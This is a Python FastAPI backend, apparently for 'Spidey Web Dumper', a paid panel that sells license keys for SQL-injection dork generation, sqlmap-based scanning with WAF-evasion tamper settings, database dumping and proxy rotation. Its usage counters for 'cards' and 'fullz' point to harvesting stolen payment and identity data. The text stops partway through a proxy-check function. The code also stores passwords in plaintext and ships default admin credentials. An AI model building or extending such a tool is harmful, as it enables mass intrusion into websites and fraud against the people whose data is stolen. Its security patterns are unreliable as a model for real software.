"""
Spidey Web Dumper — FastAPI Backend (CLEAN v3.0)
Saare fixes: SQLi scan, proxy check, cancel, toasts, disk persistence
"""
import os
import io
import json
import time
import uuid
import secrets
import string
import asyncio
import logging
import tempfile
import shutil
import zipfile
import hashlib
from collections import defaultdict
from datetime import datetime, timedelta
from pathlib import Path
from typing import Optional, List, Dict, Any
from urllib.parse import urlparse

from fastapi import (
    FastAPI, Request, Form, UploadFile, File, HTTPException,
    Depends, Cookie, Response, BackgroundTasks
)
from fastapi.responses import (
    HTMLResponse, JSONResponse, FileResponse, RedirectResponse
)
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from itsdangerous import URLSafeTimedSerializer, BadSignature

# ═══════════════════════════════════════════════════════════════════════════
#  LOGGING
# ═══════════════════════════════════════════════════════════════════════════
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("spidey_web")

# ═══════════════════════════════════════════════════════════════════════════
#  PATHS
# ═══════════════════════════════════════════════════════════════════════════
BASE_DIR        = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR        = os.path.join(BASE_DIR, "data")
OUTPUT_DIR      = os.path.join(DATA_DIR, "outputs")
WEB_DIR         = os.path.join(BASE_DIR, "web")
TEMPLATES_DIR   = os.path.join(WEB_DIR, "templates")
STATIC_DIR      = os.path.join(WEB_DIR, "static")

os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(STATIC_DIR, exist_ok=True)

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════════════
SECRET_KEY        = os.environ.get("SECRET_KEY", "spidey-web-secret-change-this-123")
ADMIN_USERNAME    = os.environ.get("ADMIN_USERNAME", "admin")
ADMIN_PASSWORD    = os.environ.get("ADMIN_PASSWORD", "SpideyPass123!")
SESSION_MAX_AGE   = 86400 * 7

USERS_FILE        = os.path.join(DATA_DIR, "web_users.json")
KEYS_FILE         = os.path.join(DATA_DIR, "web_keys.json")
LAST_RESP_FILE    = os.path.join(DATA_DIR, "last_responses.json")
FAILED_LOG_FILE   = os.path.join(DATA_DIR, "failed_logins.json")
TASKS_FILE        = os.path.join(DATA_DIR, "active_tasks.json")

# ═══════════════════════════════════════════════════════════════════════════
#  🛡️ SECURITY CONFIG
# ═══════════════════════════════════════════════════════════════════════════
ALLOWED_IPS_ENV = os.environ.get("ALLOWED_IPS", "").strip()
ALLOWED_IPS = [ip.strip() for ip in ALLOWED_IPS_ENV.split(",") if ip.strip()]

LOGIN_ATTEMPTS = defaultdict(list)
RATE_MAX = 5
RATE_WINDOW = 60

FAILED_LOGINS = defaultdict(int)
LOCKOUT_DURATION = 900
LOCKED_IPS = {}

ADMIN_PATH = os.environ.get("ADMIN_PATH", "/admin").strip()
if not ADMIN_PATH.startswith("/"):
    ADMIN_PATH = "/" + ADMIN_PATH

SESSION_IDLE_TIMEOUT = 3600
SESSIONS = {}

# ═══════════════════════════════════════════════════════════════════════════
#  APP INIT
# ═══════════════════════════════════════════════════════════════════════════
app = FastAPI(title="Spidey Web Dumper", docs_url=None, redoc_url=None)

templates = Jinja2Templates(directory=str(TEMPLATES_DIR))
app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")

serializer = URLSafeTimedSerializer(SECRET_KEY)

# ═══════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def render(name: str, ctx: dict):
    if "request" not in ctx:
        raise ValueError(f"render() called without request for {name}")
    return templates.TemplateResponse(
        request=ctx["request"], name=name, context=ctx,
    )

def _load_json(path: str, default):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return default

def _save_json(path: str, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as e:
        logger.error(f"save_json {path}: {e}")

# ═══════════════════════════════════════════════════════════════════════════
#  🛡️ SECURITY HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def get_client_ip(request: Request) -> str:
    fwd = request.headers.get("x-forwarded-for", "")
    if fwd:
        return fwd.split(",")[0].strip()
    real = request.headers.get("x-real-ip", "")
    if real:
        return real.strip()
    return request.client.host if request.client else "unknown"

def check_ip_whitelist(ip: str) -> bool:
    if not ALLOWED_IPS:
        return True
    return ip in ALLOWED_IPS

def check_rate_limit(ip: str, max_attempts: int = RATE_MAX, window: int = RATE_WINDOW) -> bool:
    now = time.time()
    attempts = LOGIN_ATTEMPTS[ip]
    attempts[:] = [t for t in attempts if now - t < window]
    if len(attempts) >= max_attempts:
        return False
    attempts.append(now)
    return True

def check_lockout(ip: str):
    if ip in LOCKED_IPS:
        unlock_time = LOCKED_IPS[ip]
        now = time.time()
        if now < unlock_time:
            return False, int(unlock_time - now)
        else:
            del LOCKED_IPS[ip]
            FAILED_LOGINS[ip] = 0
    return True, 0

def record_failed_login(ip: str, username: str):
    FAILED_LOGINS[ip] += 1
    if FAILED_LOGINS[ip] >= 5:
        LOCKED_IPS[ip] = time.time() + LOCKOUT_DURATION
        logger.warning(f"[SECURITY] IP locked: {ip}")
    try:
        logs = _load_json(FAILED_LOG_FILE, [])
        if not isinstance(logs, list):
            logs = []
        logs.append({"timestamp": datetime.now().isoformat(), "ip": ip, "username": username, "attempts": FAILED_LOGINS[ip]})
        if len(logs) > 500:
            logs = logs[-500:]
        _save_json(FAILED_LOG_FILE, logs)
    except Exception:
        pass

def reset_failed_logins(ip: str):
    FAILED_LOGINS[ip] = 0
    if ip in LOCKED_IPS:
        del LOCKED_IPS[ip]

def make_fingerprint(request: Request) -> str:
    ua = request.headers.get("user-agent", "")
    lang = request.headers.get("accept-language", "")
    return hashlib.sha256(f"{ua}|{lang}".encode()).hexdigest()[:16]

def check_strong_password(password: str):
    if len(password) < 8:
        return False, "Password must be 8+ chars"
    if not any(c.isupper() for c in password):
        return False, "Need uppercase letter"
    if not any(c.islower() for c in password):
        return False, "Need lowercase letter"
    if not any(c.isdigit() for c in password):
        return False, "Need a number"
    return True, "OK"

# ═══════════════════════════════════════════════════════════════════════════
#  USER STORAGE
# ═══════════════════════════════════════════════════════════════════════════
def load_users() -> dict:
    d = _load_json(USERS_FILE, {})
    if not isinstance(d, dict):
        d = {}
    if ADMIN_USERNAME not in d:
        d[ADMIN_USERNAME] = {
            "username": ADMIN_USERNAME,
            "password": ADMIN_PASSWORD,
            "is_admin": True,
            "created": datetime.now().isoformat(),
            "plan": "unlimited",
            "expires": None,
            "usage": {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0},
            "limits": {"keywords": 10**9, "dorks": 10**9, "urls": 10**9, "sqli": 10**9, "dumps": 10**9},
            "proxies": [],
            "proxy_stats": {"live": 0, "dead": 0, "total": 0, "checked_at": None},
        }
        _save_json(USERS_FILE, d)
    return d

def save_users(d: dict):
    _save_json(USERS_FILE, d)

def get_user(uid: str) -> Optional[dict]:
    return load_users().get(uid)

# ═══════════════════════════════════════════════════════════════════════════
#  LICENSE KEYS
# ═══════════════════════════════════════════════════════════════════════════
PLANS = {
    "1h":  {"label": "1 Hour",   "delta": timedelta(hours=1),   "price": "$1"},
    "6h":  {"label": "6 Hours",  "delta": timedelta(hours=6),   "price": "$3"},
    "1d":  {"label": "1 Day",    "delta": timedelta(days=1),    "price": "$5"},
    "3d":  {"label": "3 Days",   "delta": timedelta(days=3),    "price": "$10"},
    "7d":  {"label": "7 Days",   "delta": timedelta(days=7),    "price": "$18"},
    "15d": {"label": "15 Days",  "delta": timedelta(days=15),   "price": "$30"},
    "30d": {"label": "30 Days",  "delta": timedelta(days=30),   "price": "$50"},
    "90d": {"label": "90 Days",  "delta": timedelta(days=90),   "price": "$120"},
}

def load_keys() -> dict:
    d = _load_json(KEYS_FILE, {})
    return d if isinstance(d, dict) else {}

def save_keys(d: dict):
    _save_json(KEYS_FILE, d)

def generate_license_key() -> str:
    parts = ["".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(5)) for _ in range(4)]
    return "-".join(parts)

# ═══════════════════════════════════════════════════════════════════════════
#  LAST RESPONSE
# ═══════════════════════════════════════════════════════════════════════════
def load_last_responses() -> dict:
    d = _load_json(LAST_RESP_FILE, {})
    return d if isinstance(d, dict) else {}

def save_last_response(uid: str, action: str, data: dict):
    d = load_last_responses()
    if uid not in d:
        d[uid] = {}
    d[uid][action] = {**data, "timestamp": datetime.now().isoformat()}
    _save_json(LAST_RESP_FILE, d)

def get_last_response(uid: str, action: str = None) -> dict:
    d = load_last_responses()
    user_data = d.get(uid, {})
    if action:
        return user_data.get(action, {})
    return user_data

# ═══════════════════════════════════════════════════════════════════════════
#  TASK SYSTEM (with disk persistence)
# ═══════════════════════════════════════════════════════════════════════════
TASKS: Dict[str, dict] = {}
TASKS_LOCK = asyncio.Lock()


def load_tasks_from_disk():
    global TASKS
    try:
        data = _load_json(TASKS_FILE, {})
        if isinstance(data, dict):
            TASKS.update(data)
            logger.info(f"✅ Loaded {len(TASKS)} tasks from disk")
    except Exception as e:
        logger.error(f"Failed to load tasks: {e}")


def save_tasks_to_disk():
    try:
        active = {}
        now = datetime.now()
        for tid, t in TASKS.items():
            try:
                started = datetime.fromisoformat(t.get("started", now.isoformat()))
                age_hours = (now - started).total_seconds() / 3600
                if t.get("status") in ("done", "error", "cancelled") and age_hours > 1:
                    continue
                active[tid] = t
            except Exception:
                active[tid] = t
        _save_json(TASKS_FILE, active)
    except Exception as e:
        logger.error(f"save_tasks_to_disk: {e}")


def new_task(uid: str, task_type: str, meta: dict = None) -> str:
    tid = secrets.token_urlsafe(12)
    TASKS[tid] = {
        "id": tid, "uid": uid, "type": task_type,
        "status": "starting", "started": datetime.now().isoformat(),
        "progress": {"done": 0, "total": 0, "found": 0, "live": 0,
                     "cards": 0, "fullz": 0, "msg": "Starting...", "log": []},
        "result": None, "error": None, "meta": meta or {},
    }
    save_tasks_to_disk()
    return tid


def update_task(tid: str, **kwargs):
    if tid in TASKS:
        TASKS[tid].update(kwargs)
        save_tasks_to_disk()


def update_progress(tid: str, **kwargs):
    if tid in TASKS:
        TASKS[tid]["progress"].update(kwargs)
        save_tasks_to_disk()


def add_log(tid: str, line: str, max_lines: int = 50):
    if tid in TASKS:
        logs = TASKS[tid]["progress"].setdefault("log", [])
        logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {line}")
        if len(logs) > max_lines:
            TASKS[tid]["progress"]["log"] = logs[-max_lines:]


def get_task(tid: str) -> Optional[dict]:
    return TASKS.get(tid)


def is_cancelled(tid: str) -> bool:
    t = TASKS.get(tid)
    return t is not None and t.get("status") == "cancelled"


def cleanup_old_tasks(max_age_hours: int = 24):
    now = datetime.now()
    to_del = []
    for tid, t in TASKS.items():
        try:
            started = datetime.fromisoformat(t["started"])
            if (now - started).total_seconds() > max_age_hours * 3600:
                to_del.append(tid)
        except Exception:
            to_del.append(tid)
    for tid in to_del:
        TASKS.pop(tid, None)
    if to_del:
        save_tasks_to_disk()

# ═══════════════════════════════════════════════════════════════════════════
#  AUTH
# ═══════════════════════════════════════════════════════════════════════════
def create_session_token(username: str) -> str:
    return serializer.dumps({"u": username, "t": time.time()})

def verify_session_token(token: str) -> Optional[str]:
    if not token:
        return None
    try:
        data = serializer.loads(token, max_age=SESSION_MAX_AGE)
        return data.get("u")
    except Exception:
        return None

def get_current_user(request: Request) -> Optional[str]:
    token = request.cookies.get("spidey_session")
    if not token:
        return None
    if token in SESSIONS:
        sess = SESSIONS[token]
        now = time.time()
        if now - sess["last_active"] > SESSION_IDLE_TIMEOUT:
            SESSIONS.pop(token, None)
            return None
        current_fp = make_fingerprint(request)
        if current_fp != sess["fingerprint"]:
            SESSIONS.pop(token, None)
            return None
        sess["last_active"] = now
        return sess["uid"]
    return verify_session_token(token)

def require_user(request: Request) -> str:
    uid = get_current_user(request)
    if not uid:
        raise HTTPException(status_code=401, detail="Not logged in")
    user = get_user(uid)
    if not user:
        raise HTTPException(status_code=401, detail="User not found")
    exp = user.get("expires")
    if exp and not user.get("is_admin"):
        try:
            if datetime.fromisoformat(exp) < datetime.now():
                raise HTTPException(status_code=403, detail="Plan expired")
        except ValueError:
            pass
    return uid

def require_admin(request: Request) -> str:
    uid = require_user(request)
    user = get_user(uid)
    if not user or not user.get("is_admin"):
        raise HTTPException(status_code=403, detail="Admin only")
    return uid

# ═══════════════════════════════════════════════════════════════════════════
#  QUOTA
# ═══════════════════════════════════════════════════════════════════════════
def check_quota(uid: str, action: str, amount: int = 1):
    user = get_user(uid)
    if not user:
        return False, 0
    if user.get("is_admin"):
        return True, 10**9
    used = user.get("usage", {}).get(action, 0)
    limit = user.get("limits", {}).get(action, 0)
    remaining = max(0, limit - used)
    if used + amount > limit:
        return False, remaining
    return True, limit - used - amount

def consume_quota(uid: str, action: str, amount: int = 1):
    user = get_user(uid)
    if not user or user.get("is_admin"):
        return
    users = load_users()
    if uid not in users:
        return
    usage = users[uid].setdefault("usage", {})
    usage[action] = usage.get(action, 0) + amount
    save_users(users)

# ═══════════════════════════════════════════════════════════════════════════
#  PROXY
# ═══════════════════════════════════════════════════════════════════════════
def get_user_proxies(uid: str) -> List[str]:
    user = get_user(uid)
    if not user:
        return []
    return user.get("proxies", [])

def get_proxy_stats(uid: str) -> dict:
    user = get_user(uid)
    if not user:
        return {"total": 0, "live": 0, "dead": 0, "checked_at": None}
    proxies = user.get("proxies", [])
    stats = user.get("proxy_stats", {})
    return {
        "total": len(proxies),
        "live": stats.get("live", 0),
        "dead": stats.get("dead", 0),
        "checked_at": stats.get("checked_at"),
    }

def save_user_proxies(uid: str, proxies: List[str]):
    users = load_users()
    if uid not in users:
        return
    seen = set()
    clean = []
    for p in proxies:
        if p and p not in seen:
            seen.add(p)
            clean.append(p)
    users[uid]["proxies"] = clean
    save_users(users)

def save_proxy_stats(uid: str, live: int, dead: int, total: int):
    users = load_users()
    if uid not in users:
        return
    users[uid]["proxy_stats"] = {
        "live": live, "dead": dead, "total": total,
        "checked_at": datetime.now().isoformat(),
    }
    save_users(users)

def pick_proxy(uid: str) -> str:
    import random
    pool = get_user_proxies(uid)
    return random.choice(pool) if pool else ""

# ═══════════════════════════════════════════════════════════════════════════
#  FILE HELPERS
# ═══════════════════════════════════════════════════════════════════════════
def safe_filename(name: str) -> str:
    name = os.path.basename(name)
    return "".join(c for c in name if c.isalnum() or c in "._-")

def save_output(uid: str, filename: str, content: str) -> str:
    safe = safe_filename(filename)
    final = f"{uid[:8]}_{safe}"
    path = os.path.join(OUTPUT_DIR, final)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return final

def list_outputs() -> List[dict]:
    out = []
    try:
        for fn in os.listdir(OUTPUT_DIR):
            fp = os.path.join(OUTPUT_DIR, fn)
            if os.path.isfile(fp):
                out.append({
                    "name": fn,
                    "size": os.path.getsize(fp),
                    "mtime": os.path.getmtime(fp),
                    "time": datetime.fromtimestamp(os.path.getmtime(fp)).isoformat(),
                })
    except Exception:
        pass
    out.sort(key=lambda x: x["mtime"], reverse=True)
    return out

# ═══════════════════════════════════════════════════════════════════════════
#  ROUTES — AUTH
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    uid = get_current_user(request)
    if uid:
        return RedirectResponse("/dashboard", status_code=302)
    return RedirectResponse("/login", status_code=302)

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request, error: str = None, msg: str = None):
    uid = get_current_user(request)
    if uid:
        return RedirectResponse("/dashboard", status_code=302)
    return render("login.html", {"request": request, "error": error, "msg": msg})

@app.post("/login")
async def login_submit(request: Request, username: str = Form(...), password: str = Form(...)):
    ip = get_client_ip(request)
    if not check_ip_whitelist(ip):
        return RedirectResponse("/login?error=Access+denied", status_code=302)
    allowed, seconds_left = check_lockout(ip)
    if not allowed:
        mins = seconds_left // 60
        return RedirectResponse(f"/login?error=Locked+out.+Wait+{mins}+min", status_code=302)
    if not check_rate_limit(ip):
        return RedirectResponse("/login?error=Too+many+attempts", status_code=302)
    username = username.strip().lower()
    users = load_users()
    GENERIC_ERR = "Invalid+credentials"
    if username not in users:
        record_failed_login(ip, username)
        return RedirectResponse(f"/login?error={GENERIC_ERR}", status_code=302)
    user = users[username]
    stored = user.get("password", "")
    if not secrets.compare_digest(str(stored), str(password)):
        record_failed_login(ip, username)
        return RedirectResponse(f"/login?error={GENERIC_ERR}", status_code=302)
    exp = user.get("expires")
    if exp and not user.get("is_admin"):
        try:
            if datetime.fromisoformat(exp) < datetime.now():
                record_failed_login(ip, username)
                return RedirectResponse("/login?error=Plan+expired", status_code=302)
        except Exception:
            pass
    token = create_session_token(username)
    fingerprint = make_fingerprint(request)
    SESSIONS[token] = {"uid": username, "fingerprint": fingerprint, "last_active": time.time(), "ip": ip}
    reset_failed_logins(ip)
    resp = RedirectResponse("/dashboard", status_code=302)
    resp.set_cookie("spidey_session", token, httponly=True, secure=True, max_age=SESSION_MAX_AGE, samesite="strict")
    return resp

@app.get("/logout")
async def logout(request: Request):
    token = request.cookies.get("spidey_session")
    if token and token in SESSIONS:
        SESSIONS.pop(token, None)
    resp = RedirectResponse("/login?msg=Logged+out", status_code=302)
    resp.delete_cookie("spidey_session")
    return resp

@app.get("/register", response_class=HTMLResponse)
async def register_page(request: Request, error: str = None, msg: str = None):
    return render("register.html", {"request": request, "error": error, "msg": msg})

@app.post("/register")
async def register_submit(
    request: Request,
    username: str = Form(...),
    password: str = Form(...),
    license_key: str = Form(...),
):
    """Register with license key validation"""
    ip = get_client_ip(request)
    
    # IP + rate limit
    if not check_ip_whitelist(ip):
        return RedirectResponse("/register?error=Access+denied", status_code=302)
    if not check_rate_limit(ip, max_attempts=10, window=300):
        return RedirectResponse("/register?error=Too+many+attempts", status_code=302)
    
    username = username.strip().lower()
    
    # Validate username
    if not username or len(username) < 3 or len(username) > 20:
        return RedirectResponse("/register?error=Username+must+be+3-20+chars", status_code=302)
    if not username.isalnum() and not all(c.isalnum() or c == "_" for c in username):
        return RedirectResponse("/register?error=Only+letters+numbers+underscore", status_code=302)
    
    # Validate password
    ok, msg = check_strong_password(password)
    if not ok:
        return RedirectResponse(f"/register?error={msg.replace(' ', '+')}", status_code=302)
    
    # Check existing user
    users = load_users()
    if username in users:
        return RedirectResponse("/register?error=Username+taken", status_code=302)
    
    # ✅ VALIDATE LICENSE KEY
    key = license_key.strip().upper()
    keys = load_keys()
    if key not in keys:
        return RedirectResponse("/register?error=Invalid+license+key", status_code=302)
    
    key_data = keys[key]
    if key_data.get("used_by"):
        return RedirectResponse("/register?error=Key+already+used", status_code=302)
    
    # ✅ CREATE USER
    plan_code = key_data.get("plan", "1d")
    plan = PLANS.get(plan_code, PLANS["1d"])
    
    users[username] = {
        "username": username,
        "password": password,
        "is_admin": False,
        "created": datetime.now().isoformat(),
        "plan": plan_code,
        "plan_label": plan["label"],
        "expires": (datetime.now() + plan["delta"]).isoformat(),
        "usage": {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0},
        "limits": {
            "keywords": 500000, "dorks": 500000, "urls": 500000,
            "sqli": 100000, "dumps": 1000,
        },
        "proxies": [],
        "proxy_stats": {"live": 0, "dead": 0, "total": 0, "checked_at": None},
    }
    save_users(users)
    
    # ✅ MARK KEY AS USED
    keys[key]["used_by"] = username
    keys[key]["used_at"] = datetime.now().isoformat()
    save_keys(keys)
    
    logger.info(f"[register] New user: {username} | plan: {plan_code} | key: {key[:10]}...")
    return RedirectResponse("/login?msg=Account+created!+Login+now", status_code=302)
# ═══════════════════════════════════════════════════════════════════════════
#  ROUTES — REDEEM
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/redeem", response_class=HTMLResponse)
async def redeem_page(request: Request):
    uid = require_user(request)
    return render("redeem.html", {"request": request, "uid": uid})

@app.post("/redeem")
async def redeem_submit(request: Request, license_key: str = Form(...)):
    uid = require_user(request)
    keys = load_keys()
    key = license_key.strip().upper()
    if key not in keys:
        return RedirectResponse("/dashboard?error=Invalid+key", status_code=302)
    key_data = keys[key]
    if key_data.get("used_by") and key_data["used_by"] != uid:
        return RedirectResponse("/dashboard?error=Key+used", status_code=302)
    plan_code = key_data.get("plan", "1d")
    plan = PLANS.get(plan_code, PLANS["1d"])
    users = load_users()
    if uid not in users:
        return RedirectResponse("/login", status_code=302)
    cur_exp = users[uid].get("expires")
    base = datetime.now()
    if cur_exp:
        try:
            cur_dt = datetime.fromisoformat(cur_exp)
            if cur_dt > base:
                base = cur_dt
        except Exception:
            pass
    users[uid]["expires"] = (base + plan["delta"]).isoformat()
    users[uid]["plan"] = plan_code
    users[uid]["plan_label"] = plan["label"]
    save_users(users)
    keys[key]["used_by"] = uid
    keys[key]["used_at"] = datetime.now().isoformat()
    save_keys(keys)
    return RedirectResponse("/dashboard?msg=Plan+activated", status_code=302)

# ═══════════════════════════════════════════════════════════════════════════
#  ROUTES — PAGES
# ═══════════════════════════════════════════════════════════════════════════
@app.get("/dashboard", response_class=HTMLResponse)
async def dashboard(request: Request, msg: str = None, error: str = None):
    uid = require_user(request)
    user = get_user(uid)
    stats = {
        "keywords": user.get("usage", {}).get("keywords", 0),
        "dorks": user.get("usage", {}).get("dorks", 0),
        "urls": user.get("usage", {}).get("urls", 0),
        "sqli": user.get("usage", {}).get("sqli", 0),
        "dumps": user.get("usage", {}).get("dumps", 0),
        "cards": user.get("usage", {}).get("cards", 0),
        "fullz": user.get("usage", {}).get("fullz", 0),
    }
    limits = user.get("limits", {})
    proxy_stats = get_proxy_stats(uid)
    expires = user.get("expires")
    expiry_str = "Unlimited" if user.get("is_admin") else "N/A"
    if expires:
        try:
            dt = datetime.fromisoformat(expires)
            delta = dt - datetime.now()
            if delta.total_seconds() > 0:
                expiry_str = f"{delta.days}d {int((delta.total_seconds() % 86400) // 3600)}h left"
            else:
                expiry_str = "EXPIRED"
        except Exception:
            pass
    last = get_last_response(uid)
    return render("dashboard.html", {
        "request": request, "uid": uid, "user": user, "stats": stats,
        "limits": limits, "proxies_count": proxy_stats["total"],
        "proxy_stats": proxy_stats,
        "expiry_str": expiry_str, "is_admin": user.get("is_admin", False),
        "plan_label": user.get("plan_label", "Free Trial"),
        "last": last, "msg": msg, "error": error,
        "admin_path": ADMIN_PATH,
    })

@app.get("/keywords", response_class=HTMLResponse)
async def keywords_page(request: Request):
    uid = require_user(request)
    return render("keywords.html", {"request": request, "uid": uid, "last": get_last_response(uid, "keywords")})

@app.get("/dorks", response_class=HTMLResponse)
async def dorks_page(request: Request):
    uid = require_user(request)
    return render("dorks.html", {"request": request, "uid": uid, "last": get_last_response(uid, "dorks")})

@app.get("/parser", response_class=HTMLResponse)
async def parser_page(request: Request):
    uid = require_user(request)
    return render("parser.html", {"request": request, "uid": uid, "last": get_last_response(uid, "parser"), "proxies_count": len(get_user_proxies(uid))})

@app.get("/sqli", response_class=HTMLResponse)
async def sqli_page(request: Request):
    uid = require_user(request)
    return render("sqli.html", {"request": request, "uid": uid, "last": get_last_response(uid, "sqli")})

@app.get("/dump", response_class=HTMLResponse)
async def dump_page(request: Request):
    uid = require_user(request)
    return render("dump.html", {"request": request, "uid": uid, "last": get_last_response(uid, "dump")})

@app.get("/files", response_class=HTMLResponse)
async def files_page(request: Request):
    uid = require_user(request)
    files = list_outputs()
    user_files = [f for f in files if f["name"].startswith(uid[:8] + "_")]
    if get_user(uid).get("is_admin"):
        user_files = files
    return render("files.html", {"request": request, "uid": uid, "files": user_files})

@app.get("/proxy", response_class=HTMLResponse)
async def proxy_page(request: Request):
    uid = require_user(request)
    proxies = get_user_proxies(uid)
    stats = get_proxy_stats(uid)
    return render("proxy.html", {"request": request, "uid": uid, "proxies": proxies, "count": len(proxies), "proxy_stats": stats})

@app.get("/settings", response_class=HTMLResponse)
async def settings_page(request: Request):
    uid = require_user(request)
    user = get_user(uid)
    return render("settings.html", {
        "request": request, "uid": uid, "user": user,
        "sqlmap_defaults": {"level": 3, "risk": 2, "threads": 10, "technique": "BEUSTQ", "tamper": "space2comment,between,charencode", "crawl": 0},
    })

@app.get("/profile", response_class=HTMLResponse)
async def profile_page(request: Request):
    uid = require_user(request)
    user = get_user(uid)
    return render("profile.html", {"request": request, "uid": uid, "user": user, "last": get_last_response(uid)})

@app.get("/plans", response_class=HTMLResponse)
async def plans_page(request: Request):
    uid = require_user(request)
    return render("plans.html", {"request": request, "uid": uid, "plans": PLANS})

@app.get("/help", response_class=HTMLResponse)
async def help_page(request: Request):
    uid = require_user(request)
    return render("help.html", {"request": request, "uid": uid})

@app.get("/logs", response_class=HTMLResponse)
async def logs_page(request: Request):
    uid = require_user(request)
    user_tasks = [t for t in TASKS.values() if t["uid"] == uid]
    user_tasks.sort(key=lambda x: x["started"], reverse=True)
    return render("logs.html", {"request": request, "uid": uid, "tasks": user_tasks[:50]})

# ═══════════════════════════════════════════════════════════════════════════
#  API — KEYWORDS
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/api/keywords/generate")
async def api_keywords_generate(request: Request, seeds: str = Form(...), count: int = Form(1000)):
    uid = require_user(request)
    count = max(100, min(count, 1_000_000))
    allowed, remaining = check_quota(uid, "keywords", count)
    if not allowed:
        return JSONResponse({"error": f"Quota exceeded. Remaining: {remaining}"}, status_code=429)
    seed_list = [s.strip() for s in seeds.replace(",", "\n").splitlines() if s.strip()]
    if not seed_list:
        return JSONResponse({"error": "No seeds provided"}, status_code=400)
    tid = new_task(uid, "keywords", {"count": count, "seeds": len(seed_list)})
    asyncio.create_task(_run_keywords(tid, uid, seed_list, count))
    return {"task_id": tid}

async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
    try:
        update_task(tid, status="running")
        update_progress(tid, msg=f"Generating {count} keywords...", total=count)
        add_log(tid, f"Generating {count} keywords")
        from core.generators import generate_keywords
        loop = asyncio.get_running_loop()
        kws = await loop.run_in_executor(None, generate_keywords, seeds, count)
        kws = kws[:count]
        ts = datetime.now().strftime("%d%m%y_%H%M%S")
        fname = save_output(uid, f"keywords_{len(kws)}_{ts}.txt", "\n".join(kws))
        consume_quota(uid, "keywords", len(kws))
        save_last_response(uid, "keywords", {"count": len(kws), "file": fname, "seeds": seeds[:5]})
        update_task(tid, status="done", result={"count": len(kws), "file": fname})
        update_progress(tid, done=len(kws), total=len(kws), msg="✅ Done!")
        add_log(tid, f"✅ Generated {len(kws)} keywords")
    except Exception as e:
        logger.exception(f"[keywords] {e}")
        update_task(tid, status="error", error=str(e))

# ═══════════════════════════════════════════════════════════════════════════
#  API — DORKS
# ═══════════════════════════════════════════════════════════════════════════
@app.post("/api/dorks/generate")
async def api_dorks_generate(request: Request, keywords: str = Form(...), count: int = Form(5000), dork_type: str = Form("normal")):
    uid = require_user(request)
    count = max(100, min(count, 1_000_000))
    allowed, remaining = check_quota(uid, "dorks", count)
    if not allowed:
        return JSONResponse({"error": f"Quota exceeded. Remaining: {remaining}"}, status_code=429)
    kws = [k.strip() for k in keywords.replace(",", "\n").splitlines() if k.strip()]
    if not kws:
        return JSONResponse({"error": "No keywords provided"}, status_code=400)
    tid = new_task(uid, "dorks", {"count": count, "type": dork_type, "kw": len(kws)})
    asyncio.create_task(_run_dorks(tid, uid, kws, count, dork_type))
    return {"task_id": tid}

async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str):
    try:
        update_task(tid, status="running")
        update_progress(tid, msg=f"Generating {count} dorks ({dtype})...", total=count)
        from core.generators import (
            generate_dorks, generate_hq_sqli_dorks, generate_country_dorks,
            generate_cms_dorks, generate_exposed_dorks,
        )
        loop = asyncio.get_running_loop()
        if dtype == "hq":
            dorks = await loop.run_in_executor(None, lambda: generate_hq_sqli_dorks(kws, count))
        elif dtype == "country":
            dorks = await loop.run_in_executor(None, lambda: generate_country_dorks(kws, None, count))
        elif dtype == "cms":
            dorks = await loop.run_in_executor(None, lambda: generate_cms_dorks(kws, None, count))
        elif dtype == "exposed":
            dorks = await loop.run_in_executor(None, lambda: generate_exposed_dorks(kws, count))
        else:
            dorks = await loop.run_in_executor(None, generate_dorks, kws, count)
        dorks = dorks[:count]
        ts = datetime.now().strftime("%d%m%y_%H%M%S")
        fname = save_output(uid, f"dorks_{dtype}_{len(dorks)}_{ts}.txt", "\n".join(dorks))
        consume_quota(uid, "dorks", len(dorks))
        save_last_response(uid, "dorks", {"count": len(dorks), "type": dtype, "file": fname})
        update_task(tid, status="done", result={"count": len(dorks), "file": fname, "type": dtype})
        update_progress(tid, done=len(dorks), total=len(dorks), msg="✅ Done!")
    except Exception as e:
        logger.exception(f"[dorks] {e}")
        update_task(tid, status="error", error=str(e))





async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
    """🎯 CLEAN Proxy Check — no hang, live progress"""
    try:
        total = len(proxies)
        logger.info(f"[proxy_check:{tid}] STARTED with {total} proxies")
        
        update_task(tid, status="running")
        update_progress(tid, done=0, total=total, live=0, msg=f"Checking {total} proxies...")
        add_log(tid, f"⚡ Checking {total} proxies...")
        
        from core.proxy import check_proxies_bulk
        last_edit = [time.time()]
        
        async def on_prog(checked, tot, live):
            if is_cancelled(tid):
                return
            now = time.time()
            if now - last_edit[0] >= 1.0:
                last_edit[0] = now
                update_progress(tid, done=checked, total=tot, live=live,
                                msg=f"Checked {checked}/{tot} | Live {live}")
                logger.info(f"[proxy_check:{tid}] {checked}/{tot} | Live {live}")
        
        live_list = await check_proxies_bulk(
            proxies, timeout=5.0, concurrency=300, progress_callback=on_prog
        )
        
        logger.info(f"[proxy_check:{tid}] Done. Live: {len(live_list)}")
        
        if is_cancelled(tid):
            add_log(tid, "⛔ Cancelled")
